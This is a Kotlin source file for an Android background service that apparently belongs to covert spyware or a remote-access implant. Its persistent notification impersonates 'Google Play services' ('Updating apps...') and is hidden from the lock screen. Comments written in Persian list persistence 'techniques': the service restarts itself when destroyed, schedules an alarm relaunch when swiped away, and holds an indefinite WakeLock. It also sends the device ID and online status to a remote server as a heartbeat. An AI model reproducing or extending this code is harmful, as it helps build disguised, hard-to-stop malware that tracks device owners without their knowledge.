package com.android.system.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import com.android.system.services.utils.DirectBootHelper
import com.android.system.services.utils.UnifiedWatchdogScheduler
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class UnifiedService : Service() {

    companion object {
        @Volatile var isRunning = false

        private const val TAG = "UnifiedService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "unified_service_channel"
        private const val NETWORK_CHECK_INTERVAL_MS = 10000L

        private const val PREF = "unified_service"
        private const val KEY_LAST_ALIVE = "last_alive"

        fun markAlive(ctx: Context) {
            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
                .edit().putLong(KEY_LAST_ALIVE, SystemClock.elapsedRealtime()).apply()
        }

        fun lastAlive(ctx: Context): Long =
            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).getLong(KEY_LAST_ALIVE, 0L)
    }

    private lateinit var deviceId: String
    private lateinit var connectivityManager: ConnectivityManager
    private var isCallbackRegistered = false
    private var lastOnlineState: Boolean? = null

    private var wakeLock: PowerManager.WakeLock? = null
    private var heartbeatJob: Job? = null
    private var cleanupJob: Job? = null
    private var networkCheckerJob: Job? = null

    private val serviceScope = CoroutineScope(
        SupervisorJob() + Dispatchers.IO + CoroutineExceptionHandler { _, t ->
            Log.e(TAG, "Coroutine error: ${t.message}", t)
        }
    )

    private val heartbeatInterval: Long
        get() = ServerConfig.getHeartbeatInterval()

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            checkAndUpdateNetworkStatus()
        }

        override fun onLost(network: Network) {
            checkAndUpdateNetworkStatus()
        }

        override fun onCapabilitiesChanged(
            network: Network,
            capabilities: NetworkCapabilities
        ) {
            checkAndUpdateNetworkStatus()
        }
    }

    override fun onCreate() {
        super.onCreate()
        DirectBootHelper.logStatus(this)

        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        try {
            ServerConfig.initialize(this)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize ServerConfig: ${e.message}")
        }

        acquireWakeLock()
        startForegroundNotification()
        registerNetworkCallback()
        startCleanupLoop()
        startHeartbeat()
        startNetworkChecker()
        checkAndUpdateNetworkStatus()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) {
            Log.d(TAG, "Already running, skip duplicate start")
            return START_STICKY
        }
        isRunning = true

        if (!isCallbackRegistered) {
            registerNetworkCallback()
        }
        checkAndUpdateNetworkStatus()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        
        // 🔥 تکنیک 1: خودش رو دوباره راه‌اندازی میکنه
        restartService()
        
        wakeLock?.release()
        unregisterNetworkCallback()

        serviceScope.launch {
            cleanup()
            UnifiedWatchdogScheduler.kickNow(applicationContext)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // 🔥 تکنیک 2: وقتی از recent apps پاک میشه، با AlarmManager دوباره اجرا میشه
        scheduleRestartWithAlarm()
        
        serviceScope.launch {
            cleanup()
            UnifiedWatchdogScheduler.kickNow(applicationContext)
        }
    }
    
    // 🔥 تکنیک 3: راه‌اندازی مجدد فوری
    private fun restartService() {
        try {
            val intent = Intent(applicationContext, UnifiedService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(intent)
            } else {
                applicationContext.startService(intent)
            }
            Log.d(TAG, "Service restart initiated from onDestroy")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restart service: ${e.message}", e)
        }
    }
    
    // 🔥 تکنیک 4: AlarmManager برای راه‌اندازی بعد از 1 ثانیه
    private fun scheduleRestartWithAlarm() {
        try {
            val intent = Intent(applicationContext, UnifiedService::class.java)
            intent.setPackage(packageName)
            
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            } else {
                PendingIntent.FLAG_UPDATE_CURRENT
            }
            
            val pendingIntent = PendingIntent.getService(
                applicationContext,
                1001,
                intent,
                flags
            )
            
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            
            // راه‌اندازی دقیق بعد از 1 ثانیه
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 1000,
                    pendingIntent
                )
            } else {
                alarmManager.setExact(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 1000,
                    pendingIntent
                )
            }
            
            Log.d(TAG, "Restart scheduled with AlarmManager")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule restart: ${e.message}", e)
        }
    }

    // ==================== Heartbeat ====================

    private fun startHeartbeat() {
        heartbeatJob = serviceScope.launch {
            delay(2000) // Initial delay
            while (isActive) {
                markAlive(applicationContext)
                sendHeartbeat()
                delay(heartbeatInterval)
            }
        }
    }

    private suspend fun sendHeartbeat() = withContext(Dispatchers.IO) {
        try {
            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("isOnline", true)
                put("timestamp", System.currentTimeMillis())
                put("source", "UnifiedService")
            }

            val baseUrl = ServerConfig.getBaseUrl()
            val urlString = "$baseUrl/devices/heartbeat"

            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { os ->
                val bytes = body.toString().toByteArray()
                os.write(bytes)
                os.flush()
            }

            val responseCode = conn.responseCode

            if (responseCode in 200..299) {
                conn.inputStream.bufferedReader().use { it.readText() }
            } else {
                conn.errorStream?.bufferedReader()?.use { it.readText() }
            }

            conn.disconnect()
        } catch (e: Exception) {
            Log.e(TAG, "Heartbeat error: ${e.message}", e)
        }
    }

    // ==================== Network Monitoring ====================

    private fun startNetworkChecker() {
        networkCheckerJob = serviceScope.launch {
            while (isActive) {
                markAlive(applicationContext)
                checkAndUpdateNetworkStatus()
                delay(NETWORK_CHECK_INTERVAL_MS)
            }
        }
    }

    private fun registerNetworkCallback() {
        if (isCallbackRegistered) {
            return
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val networkRequest = NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .build()

                connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
                isCallbackRegistered = true
                Log.d(TAG, "Network callback registered")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register NetworkCallback", e)
        }
    }

    private fun unregisterNetworkCallback() {
        if (!isCallbackRegistered) return

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                connectivityManager.unregisterNetworkCallback(networkCallback)
                isCallbackRegistered = false
                Log.d(TAG, "Network callback unregistered")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister NetworkCallback", e)
        }
    }

    private fun checkAndUpdateNetworkStatus() {
        val currentState = isNetworkAvailable()

        if (lastOnlineState == null || lastOnlineState != currentState) {
            lastOnlineState = currentState
            updateOnlineStatus(currentState)
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork ?: return false
                val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

                val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                val hasTransport = capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)

                hasInternet && hasTransport
            } else {
                @Suppress("DEPRECATION")
                val netInfo = connectivityManager.activeNetworkInfo
                netInfo != null && netInfo.isConnected
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking network", e)
            false
        }
    }

    private fun updateOnlineStatus(isOnline: Boolean) {
        serviceScope.launch {
            try {
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("isOnline", isOnline)
                    put("timestamp", System.currentTimeMillis())
                    put("source", "UnifiedService")
                }

                val baseUrl = ServerConfig.getBaseUrl()
                val url = URL("$baseUrl/devices/heartbeat")
                val conn = url.openConnection() as HttpURLConnection

                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                conn.responseCode
                conn.disconnect()

                Log.d(TAG, "Network status updated: isOnline=$isOnline")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to update network status", e)
            }
        }
    }

    // ==================== System Utilities ====================

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$TAG::WakeLock"
            )
            // 🔥 تکنیک 5: WakeLock بدون timeout - همیشه بیدار
            wakeLock?.acquire()
            Log.d(TAG, "WakeLock acquired (indefinite)")
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock failed: ${e.message}")
        }
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play services",
                NotificationManager.IMPORTANCE_LOW // 🔹 higher than MIN to keep alive
            ).apply {
                description = "Google Play services keeps your apps up to date"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play services")
            .setContentText("Updating apps...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT) // 🔹 not too low
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun startCleanupLoop() {
        cleanupJob = serviceScope.launch {
            while (isActive) {
                delay(10 * 60 * 1000L) // Every 10 minutes
                val rt = Runtime.getRuntime()
                val usedMB = (rt.totalMemory() - rt.freeMemory()) / 1024 / 1024
                if (usedMB > 120) {
                    runCatching { cacheDir.deleteRecursively() }
                    Log.d(TAG, "Cache cleaned (used memory: ${usedMB}MB)")
                }
            }
        }
    }

    private suspend fun cleanup() = withContext(Dispatchers.IO) {
        cleanupJob?.cancel()
        heartbeatJob?.cancel()
        networkCheckerJob?.cancel()
        serviceScope.coroutineContext.cancelChildren()
        Log.d(TAG, "Service cleaned up")
    }
}







